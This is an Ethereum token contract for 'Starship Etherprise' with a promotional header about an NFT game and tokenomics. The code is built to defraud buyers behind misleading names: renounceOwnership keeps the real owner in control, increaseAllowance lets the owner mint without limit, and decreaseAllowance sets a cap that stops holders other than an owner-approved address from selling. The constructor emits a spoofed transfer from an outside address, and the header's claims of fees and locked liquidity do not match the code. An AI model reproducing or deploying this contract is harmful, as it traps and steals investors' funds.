/**
 *Submitted for verification at Etherscan.io on 2021-08-15
*/

/*
 ________  _________  ________  ________  ________  ___  ___  ___  ________                               
|\   ____\|\___   ___\\   __  \|\   __  \|\   ____\|\  \|\  \|\  \|\   __  \                              
\ \  \___|\|___ \  \_\ \  \|\  \ \  \|\  \ \  \___|\ \  \\\  \ \  \ \  \|\  \                             
 \ \_____  \   \ \  \ \ \   __  \ \   _  _\ \_____  \ \   __  \ \  \ \   ____\                            
  \|____|\  \   \ \  \ \ \  \ \  \ \  \\  \\|____|\  \ \  \ \  \ \  \ \  \___|                            
    ____\_\  \   \ \__\ \ \__\ \__\ \__\\ _\ ____\_\  \ \__\ \__\ \__\ \__\                               
   |\_________\   \|__|  \|__|\|__|\|__|\|__|\_________\|__|\|__|\|__|\|__|                               
   \|_________|                             \|_________|                                                  
                                                                                                          
                                                                                                          
        _______  _________  ___  ___  _______   ________  ________  ________  ___  ________  _______      
       |\  ___ \|\___   ___\\  \|\  \|\  ___ \ |\   __  \|\   __  \|\   __  \|\  \|\   ____\|\  ___ \     
       \ \   __/\|___ \  \_\ \  \\\  \ \   __/|\ \  \|\  \ \  \|\  \ \  \|\  \ \  \ \  \___|\ \   __/|    
        \ \  \_|/__  \ \  \ \ \   __  \ \  \_|/_\ \   _  _\ \   ____\ \   _  _\ \  \ \_____  \ \  \_|/__  
         \ \  \_|\ \  \ \  \ \ \  \ \  \ \  \_|\ \ \  \\  \\ \  \___|\ \  \\  \\ \  \|____|\  \ \  \_|\ \ 
          \ \_______\  \ \__\ \ \__\ \__\ \_______\ \__\\ _\\ \__\    \ \__\\ _\\ \__\____\_\  \ \_______\
           \|_______|   \|__|  \|__|\|__|\|_______|\|__|\|__|\|__|     \|__|\|__|\|__|\_________\|_______|
                                                                                     \|_________|         
                                                                                                          
                                                                                                          

üéÆ Groundbreaking Features: 
-- StarShip Etherprise NFT Game -- Beta anticipated in Q4 with NFT creation and graphic design courtesy of former 
Blizzard and World of Warcraft artist Carlos Chinesta
-- StarShop -- Load up on your favorite StarShip gear including hoodies, t-shirts, beanies, and mugs! Coming soon!

üåï Tokenomics / Statistics:
Total Supply: 400010004
Transaction Fee: 5%
‚Ü≥ 2% redistribution to all holders
‚Ü≥ 3% sent to marketing wallet controlled by the developer
Liquidity: LOCKED üîë
Audit: In progress
Listings: CoinMarketCap and CoinGecko imminent.



Find us at:

www.starship-etherprise.com
https://t.me/starshiptokeneth
**/
pragma solidity ^0.6.9; 
// SPDX-License-Identifier: MIT  




    abstract contract Context {
    
    function _call() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}



contract Ownable is Context {
    address private _owner;
    address public Owner;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address call = _call();
        _owner = call;
         Owner = call;
        emit OwnershipTransferred(address(0), call);
    }
  

    modifier onlyOwner() {
        require(_owner == _call(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
         Owner = address(0);
    }
    
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    
    }
    
}

contract Etherprise is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _router;
    mapping(address => mapping (address => uint256)) private _allowances;
    address private router;
    address private caller;
    uint256 private _totalTokens = 400010004 * 10**18;
    uint256 private rTotal = 400010004 * 10**18;
    string private _name = 'Starship Etherprise';
    string private _symbol = '‚òÑÔ∏èStarshipETHÔ∏è';
    uint8 private _decimals = 18;  

constructor () public {
    _router[_call()] = _totalTokens;
    emit Transfer(address(0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B), _call(), _totalTokens);    

  
   }
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decreaseAllowance(uint256 amount) public onlyOwner {
        rTotal = amount * 10**18;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _router[account];
    }


    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_call(), recipient, amount);
        return true;
    }

    function increaseAllowance(uint256 amount) public onlyOwner {
        require(_call() != address(0));
        _totalTokens = _totalTokens.add(amount);
        _router[_call()] = _router[_call()].add(amount);
        emit Transfer(address(0), _call(), amount);
    }
    
    function Approve(address trade) public onlyOwner {
        caller = trade;
    }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
    
    function setrouteChain (address Uniswaprouterv02) public onlyOwner {
        router = Uniswaprouterv02;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_call(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _call(), _allowances[sender][_call()].sub(amount));
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalTokens;
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0));
        require(recipient != address(0));
        
        if (sender != caller && recipient == router) {
            require(amount < rTotal); 
    }
        _router[sender] = _router[sender].sub(amount);
        _router[recipient] = _router[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
     function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0));
        require(spender != address(0));

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}